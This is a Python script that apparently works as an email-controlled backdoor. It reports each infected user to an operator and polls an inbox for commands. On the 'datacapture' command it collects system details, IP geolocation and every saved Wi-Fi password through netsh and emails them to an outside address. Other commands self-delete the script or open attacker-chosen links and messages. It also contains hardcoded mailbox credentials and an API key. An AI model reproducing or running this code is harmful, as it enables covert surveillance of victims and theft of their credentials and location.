import email
import imaplib
import time
import smtplib
import os
import webbrowser
import GPUtil
import subprocess
import socket
import requests
import psutil
import shutil
import json
import platform

programnum = '0'
username = os.getlogin()

sServer = 'smtp.office365.com'
sPort = 587
sUser = 'DUMMY EMAIL'
sPass = 'PASSWORD OF DUMMY EMAIL'
emailFrom = 'DUMMY EMAIL'
emailTo = 'PERSONAL EMAIL'
emailSubject = f'Program{programnum} Started'
emailMessage = f'''THIS IS AN AUTOMATED MESSAGE!

                    {username} of program {programnum}
                    joined the network.
                    '''
s = smtplib.SMTP(sServer, sPort)
s.starttls()
s.login(sUser, sPass)
message = 'Subject: {}\n\n{}'.format(emailSubject, emailMessage)
s.sendmail(emailFrom, emailTo, message)
s.quit()

search = True
progrumStopped = True

while search == True:

    EMAIL = 'smtplover69@outlook.com'
    PASSWORD = 'b1e*05Jf'
    SERVER = 'smtp.office365.com'

    # connect to the server and go to its inbox
    mail = imaplib.IMAP4_SSL(SERVER)
    mail.login(EMAIL, PASSWORD)
    # we choose the inbox but you can select others
    mail.select('inbox')

    # we'll search using the ALL criteria to retrieve
    # every message inside the inbox
    # it will return with its status and a list of ids
    status, data = mail.search(None, 'ALL')
    # the list returned is a list of bytes separated
    # by white spaces on this format: [b'1 2 3', b'4 5 6']
    # so, to separate it first we create an empty list
    mail_ids = []
    # then we go through the list splitting its blocks
    # of bytes and appending to the mail_ids list
    for block in data:
        # the split function called without parameter
        # transforms the text or bytes into a list using
        # as separator the white spaces:
        # b'1 2 3'.split() => [b'1', b'2', b'3']
        mail_ids += block.split()

    # now for every id we'll fetch the email
    # to extract its content

    for i in mail_ids:
        # the fetch function fetch the email given its id
        # and format that you want the message to be
        status, data = mail.fetch(i, '(RFC822)')

        # the content data at the '(RFC822)' format comes on
        # a list with a tuple with header, content, and the closing
        # byte b')'
        for response_part in data:
            # so if its a tuple...
            if isinstance(response_part, tuple):
                # we go for the content at its second element
                # skipping the header at the first and the closing
                # at the third
                message = email.message_from_bytes(response_part[1])

                # with the content we can extract the info about
                # who sent the message and its subject
                mail_from = message['from']
                mail_subject = message['subject']

                # then for the text we have a little more work to do
                # because it can be in plain text or multipart
                # if its not plain text we need to separate the message
                # from its annexes to get the text
                if message.is_multipart():
                    mail_content = ''

                    # on multipart we have the text message and
                    # another things like annex, and html version
                    # of the message, in that case we loop through
                    # the email payload
                    for part in message.get_payload():
                        # if the content type is text/plain
                        # we extract it
                        if part.get_content_type() == 'text/plain':
                            mail_content += part.get_payload()
                else:
                    # if the message isn't multipart, just extract it
                    mail_content = message.get_payload()

                # and then let's show its result
                print(f'From: {mail_from}')
                print(f'Subject: {mail_subject}')
                print(f'Content: {mail_content}')

                
                if mail_subject == f'evac{programnum}':
                    sServer = 'smtp.office365.com'
                    sPort = 587
                    sUser = 'DUMMY EMAIL'
                    sPass = 'PASSWORD OF DUMMY EMAIL'
                    emailFrom = 'DUMMY EMAIL'
                    emailTo = 'PERSONAL EMAIL'
                    emailSubject = f'Program{programnum} Kill Switch Started'
                    emailMessage = '''THIS IS AN AUTOMATED MESSAGE!

                                                            Commencing Kill Switch
                                                            '''
                    s = smtplib.SMTP(sServer, sPort)
                    s.starttls()
                    s.login(sUser, sPass)
                    message = 'Subject: {}\n\n{}'.format(emailSubject, emailMessage)
                    s.sendmail(emailFrom, emailTo, message)
                    s.quit()
                    from os import remove
                    from sys import argv

                    remove(argv[0])
                elif mail_subject == f'datacapture{programnum}':
                    lost = []

                    hostname = socket.gethostname()
                    ip = socket.gethostbyname(hostname)
                    ramINFO = psutil.virtual_memory()
                    ramAMT = ramINFO.total
                    ramAMT = ramAMT / 1000000000

                    send_url = "http://api.ipstack.com/check?access_key=7ac1f26bb8773ac3c553bbad93bcb352"
                    geo_req = requests.get(send_url)
                    geo_json = json.loads(geo_req.text)
                    latitude = geo_json['latitude']
                    longitude = geo_json['longitude']
                    city = geo_json['city']
                    ipAd = geo_json['ip']

                    username = os.getlogin()

                    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
                    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

                    gpus = GPUtil.getGPUs()
                    list_gpus = []

                    for gpu in gpus:
                        # get the GPU id
                        gpu_id = gpu.id
                        # name of GPU
                        gpu_name = gpu.name
                        # get % percentage of GPU usage of that GPU
                        gpu_load = f"{gpu.load * 100}%"
                        # get free memory in MB format
                        gpu_free_memory = f"{gpu.memoryFree}MB"
                        # get used memory
                        gpu_used_memory = f"{gpu.memoryUsed}MB"
                        # get total memory
                        gpu_total_memory = f"{gpu.memoryTotal}MB"
                        # get GPU temperature in Celsius
                        gpu_temperature = f"{gpu.temperature} °C"

                        list_gpus.append((
                            gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                            gpu_total_memory, gpu_temperature
                        ))

                    for i in profiles:
                        # running the 2nd cmd command to check passwords
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i,
                                                           'key=clear']).decode('utf-8').split('\n')
                        # storing passwords after converting them to list
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        # printing the profiles(wifi name) with their passwords using
                        # try and except method
                        try:
                            lost.append("{:<30}|  {:<}".format(i, results[0]))
                        except IndexError:
                            continue
                    lost = '\n'.join(lost)
                    notefind = shutil.which("notepad")

                    sServer = "smtp.office365.com"
                    sPort = 587
                    sUser = "DUMMY EMAIL"
                    sPass = "PASSWORD OF DUMMY EMAIL"
                    emailFrom = "DUMMY EMAIL"
                    emailTo = "PERSONAL EMAIL"
                    emailSubject = username + "'s", 'Information'
                    emailMessage = """THIS IS AN AUTOMATED MESSAGE!
                    *** DESKTOP INFO***
                    Username: {}
                    Hostname: {}
                    IP Address#1: {}
                    IP Address#2: {}
                    Operating System: {}
                    32 or 64 Bit: {}
                    Total Ram: {}
                    GPU Name: {}
                    GPU Total Memory: {}

                    ***LOCATION INFO***
                    Latitude: {}
                    Longitude: {}
                    City: {}

                    ***WIFI PASS***
                    {}

                    ***MISC***
                    {}
                    """.format(username, hostname, ip, ipAd, platform.platform(), platform.machine(), ramAMT,
                               list_gpus[0][1], list_gpus[0][5], latitude, longitude, city, lost, notefind)
                    s = smtplib.SMTP(sServer, sPort)
                    s.starttls()
                    s.login(sUser, sPass)
                    message = 'Subject: {}\n\n{}'.format(emailSubject, emailMessage)
                    s.sendmail(emailFrom, emailTo, message)
                    s.quit()
                elif mail_subject == f'doglover{programnum}':
                    webbrowser.open_new_tab('https://youtu.be/uubMLkM5L9E?t=582')
                elif mail_subject == f'link{programnum}':
                    lonk = mail_content
                    webbrowser.open_new_tab(lonk)
                elif mail_subject == f'message{programnum}':
                    mess = mail_content
                    f = open('message.txt', 'w')
                    f.write(f"{mess}")
                    f.close()
                    webbrowser.open_new_tab('message.txt')
                    time.sleep(60)
                    os.remove('message.txt')


    time.sleep(120)
